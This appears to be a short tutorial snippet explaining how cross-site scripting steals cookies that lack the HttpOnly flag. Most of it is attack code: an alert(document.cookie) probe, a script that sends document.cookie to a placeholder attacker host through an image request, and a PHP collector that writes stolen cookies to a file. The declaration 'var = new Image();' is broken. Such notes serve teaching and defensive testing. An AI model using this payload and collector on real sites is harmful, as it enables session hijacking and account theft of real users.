* JavaScript can steal cookies if they do not have the **HttpOnly flag** enabled; this means that an XSS attack can
be used to steal the cookies.

`<script>alert(document.cookie)</script>`

with the following code,you can send cookies content to an attacker-controlled site.

```
<script>
var = new Image();
i.src = "http://ip_del_atacante/log.php?q="+document.cookie;
</script>
```
The scripts generate an image object and points its `src` to script on the attacker's server(attacker.site)

The `log.php` script saves the cookie in a text file on the attacker.site
```
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename,'a');
$cookie=$_GET['q'];
fwrite($fp,$cookie);
fclose($fp);
?>
```
